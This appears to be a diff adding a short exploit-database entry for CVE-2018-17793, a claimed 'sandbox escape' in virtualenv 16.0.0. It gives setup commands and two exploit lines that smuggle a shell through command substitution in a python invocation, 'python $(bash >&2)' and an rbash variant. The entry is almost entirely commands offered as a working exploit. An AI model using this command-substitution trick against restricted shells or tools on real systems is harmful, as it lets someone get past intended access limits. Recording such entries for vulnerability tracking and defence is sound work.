@@ -1,0 +1,19 @@
+# Exploit Title: virtualenv 16.0.0 - Sandbox Escape
+# Date: 2018-10-02
+# Exploit Author: vr_system
+# Vendor Homepage: https://virtualenv.pypa.io/en/stable/
+# Software Link: https://virtualenv.pypa.io/en/stable/
+# Version: 16.0.0
+# Tested on: kali linux
+# CVE : CVE-2018-17793
+
+# 1 Install
+# root@kali:~#pip install virtualenv
+# root@kali:~#virtualenv test_env
+# root@kali:~#cd test_env/
+# root@kali:~/test_env#source ./bin/activate
+
+# 2 Sandbox escape
+
+(test_env) root@kali:~/test_env#python $(bash >&2)
+(test_env) root@kali:~/test_env#python $(rbash >&2)
